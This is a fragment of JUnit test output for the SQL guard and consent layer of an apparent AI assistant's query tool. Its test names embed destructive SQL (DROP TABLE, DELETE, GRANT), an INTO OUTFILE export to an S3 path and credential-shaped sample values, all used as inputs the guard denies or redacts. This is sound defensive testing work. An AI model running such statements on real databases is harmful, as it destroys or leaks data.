+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_multi_statement_outfile_payload_cannot_smuggle_the_export" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_plain_read_only_statements_still_pass_the_write_clause_scan" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_outfile_guard_is_enforced_at_the_shared_pipeline" time="0.030" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_read_only_grant_does_not_cover_into_outfile_classification" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN DROP TABLE x]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN ANALYZE DELETE FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN ANALYZE INSERT INTO t VALUES (1)]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN UPDATE t SET a = 1]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN GRANT SELECT ON t TO u]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN CREATE TABLE x (a INT)]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN SELECT 1 INTO OUTFILE 's3://b/x']" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_read_only_statement_stays_read_only[EXPLAIN SELECT 1]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_read_only_statement_stays_read_only[EXPLAIN ANALYZE SELECT * FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_read_only_statement_stays_read_only[EXPLAIN WITH x AS (SELECT 1) SELECT * FROM x]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_read_only_statement_stays_read_only[EXPLAIN SHOW TABLES]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_read_only_statement_stays_read_only[EXPLAIN DESCRIBE t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_refused_before_the_engine" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_grant_never_auto_approves_explain_over_a_mutation" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_body_is_denied[WITH x AS (SELECT 1) DELETE FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_body_is_denied[WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_body_is_denied[WITH x AS (SELECT 1) UPDATE t SET a = 1]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_body_is_denied[WITH a AS (SELECT 1), b AS (SELECT 2) DELETE FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_body_is_denied[WITH RECURSIVE x(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM x WHERE n &lt; 5) DELETE FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_select_body_is_read_only[WITH x AS (SELECT 1) SELECT * FROM x]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_select_body_is_read_only[WITH a AS (SELECT 1), b AS (SELECT 2) SELECT * FROM a JOIN b]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_select_body_is_read_only[WITH RECURSIVE x(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM x WHERE n &lt; 5) SELECT * FROM x]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_select_body_is_read_only[WITH x AS (SELECT '(') SELECT * FROM x]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_payload_is_refused_before_the_engine" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_destructive_call_never_auto_approves_even_with_a_grant" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_read_only_call_is_covered_by_an_allow_session_grant" time="0.003" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_deny_decision_blocks_execution" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_engine_privilege_error_terminates_without_elevated_retry" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_engine_privilege_error_in_result_terminates" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_audit_row_is_correlated_by_conversation_id" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_auth_session_id_is_used_when_no_conversation_is_present" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_audit_sql_is_redacted_and_never_stores_rows" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_preview_is_redacted_sql" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_preview_withholds_sql_it_cannot_redact" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_result_error_is_redacted_for_both_sinks" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_result_error_never_reaches_the_sse_frame" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_privilege_error_classification_reads_the_unredacted_message" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_result_warning_is_redacted_in_the_model_summary" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_result_warning_uses_the_shared_redactor" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_result_without_a_warning_is_unchanged" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unredactable_warning_is_withheld_not_leaked" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[password]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[user_password]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[api_key]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[apiKey]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[access-key]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[client_secret]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[bearer]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_column_names_are_not_flagged[id]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_column_names_are_not_flagged[name]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_column_names_are_not_flagged[created_at]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_column_names_are_not_flagged[token_count]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_shaped_values_are_detected[AKIAIOSFODNN7EXAMPLE]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_shaped_values_are_detected[-----BEGIN RSA PRIVATE KEY-----]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_shaped_values_are_detected[sk-abcdefghijklmnopqrstuvwxyz123456]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_shaped_values_are_detected[ghp_abcdefghijklmnopqrstuvwxyz0123456789]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_shaped_values_are_detected[eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[userPassword]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[userpassword]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[UserPassword]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[secretKey]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[accessToken]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[privateKey]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[hashedPassword]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[dbPass]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[clientSecret]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[sessionToken]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[accountKey]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[sasToken]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[APIKey]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[pwd]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[user_pwd]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[user-pwd]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[userPwd]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[note]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[status]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[user_name]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[file_path]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[keyword]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[compass]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_values_are_not_flagged[hello world]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_values_are_not_flagged[12345]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_values_are_not_flagged[2026-09-18]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_values_are_not_flagged[None]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_redact_rows_is_value_level_not_the_sql_helper" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_redact_rows_redacts_every_cell_of_a_credential_column" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_none_stays_none_in_a_credential_column" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_value_is_redacted_before_entering_the_model_summary" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_password_columns_are_redacted_before_the_model" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_max_rows_is_passed_to_the_service_for_every_call" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_default_row_cap_is_the_spec_value" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_registry_exposes_query_execute" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_query_execute_satisfies_the_tool_protocol" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_tool_schema_is_advertised_to_the_model" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_tool_call_view_carries_the_classification" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_mission_cancelled_during_consent_never_starts_mutation" time="0.001" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_before_dispatch_is_terminal[search-provider]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_before_dispatch_is_terminal[search-consent]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_before_dispatch_is_terminal[feature-provider]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_before_dispatch_is_terminal[feature-consent]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_live_resource_revocation_after_admission_blocks_data[search]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_live_resource_revocation_after_admission_blocks_data[feature]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_prefetched_resource_cannot_bypass_release_recheck[search]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_prefetched_resource_cannot_bypass_release_recheck[feature]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_definition_change_without_version_bump_is_terminal[search]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_definition_change_without_version_bump_is_terminal[feature]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_during_data_read_never_publishes[search-False]" time="0.004" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_during_data_read_never_publishes[search-True]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_during_data_read_never_publishes[feature-False]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_during_data_read_never_publishes[feature-True]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_definition_drift_during_same_version_read_discards_result[search]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_definition_drift_during_same_version_read_discards_result[feature]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_resource_revocation_during_read_discards_result[search]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_resource_revocation_during_read_discards_result[feature]" time="0.004" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_resource_drift_blocks_mutation_even_for_an_unrelated_tool[search]" time="0.004" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_resource_drift_blocks_mutation_even_for_an_unrelated_tool[feature]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_drift_already_present_at_admission_never_calls_provider[search]" time="0.002" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_drift_already_present_at_admission_never_calls_provider[feature]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_unchanged_resource_still_runs_with_current_caller[search]" time="0.005" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_unchanged_resource_still_runs_with_current_caller[feature]" time="0.005" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_feature_explicit_other_version_cannot_bypass_release" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_feature_request_uses_release_version[None]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_feature_request_uses_release_version[1]" time="0.004" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_legacy_feature_explicit_version_is_preserved" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_tool_owner_discards_wrong_version_before_return[search]" time="0.001" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_tool_owner_discards_wrong_version_before_return[feature]" time="0.002" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_unpinned_dispatch_does_not_read_release_resources[None]" time="0.001" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_unpinned_dispatch_does_not_read_release_resources[manifest1]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_owner_can_resolve_their_own_pending_call" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_foreign_user_gets_404_and_cannot_resolve_same_loop" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_foreign_user_gets_404_and_cannot_resolve" time="0.021" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_foreign_user_cannot_deny_either" time="0.016" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_unknown_tool_call_id_is_404" time="0.012" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_owner_sets_the_grant_on_their_own_conversation_only" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_allow_session_on_a_read_only_call_sets_the_grant" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_agent_studio_allow_session_sets_the_same_read_only_grant" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_allow_session_on_a_non_read_only_call_is_rejected[destructive]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_allow_session_on_a_non_read_only_call_is_rejected[denied]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_allow_session_on_a_non_read_only_call_is_400_over_http" time="0.011" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_owner_revoke_clears_the_grant" time="0.013" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_foreign_revoke_is_404_and_leaves_the_owner_grant_intact" time="0.010" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_owner_sets_the_grant_on_a_fresh_thread" time="0.010" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_read_only_approval_without_a_login_is_refused[False]" time="0.011" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_read_only_approval_without_a_login_is_refused[True]" time="0.012" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_owner_clears_the_grant_with_false" time="0.010" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_foreign_set_is_404_and_leaves_the_owner_grant_untouched" time="0.011" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_set_grant_does_not_reset_a_grant_on_another_thread" time="0.011" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_revoked_grant_prompts_again_on_the_next_read_only_call" time="0.015" />
+    <testcase classname="tests.unit.test_tool_proposal_identity" name="test_server_proposal_ids_are_independent_of_provider_fields" time="0.000" />
+    <testcase classname="tests.unit.test_tool_proposal_identity" name="test_synthetic_call_without_a_wire_id_gets_a_separate_protocol_identity" time="0.000" />
+    <testcase classname="tests.unit.test_tool_proposal_identity" name="test_malformed_provider_id_is_rejected_before_consent[False]" time="0.000" />
+    <testcase classname="tests.unit.test_tool_proposal_identity" name="test_malformed_provider_id_is_rejected_before_consent[7]" time="0.000" />
+    <testcase classname="tests.unit.test_tool_proposal_identity" name="test_malformed_provider_id_is_rejected_before_consent[wire_id2]" time="0.000" />
+    <testcase classname="tests.unit.test_tool_proposal_identity" name="test_malformed_provider_id_is_rejected_before_consent[wire_id3]" time="0.000" />
+    <testcase classname="tests.unit.test_tool_proposal_identity" name="test_malformed_provider_id_is_rejected_before_consent[]" time="0.003" />
+  </testsuite>
+</testsuites>
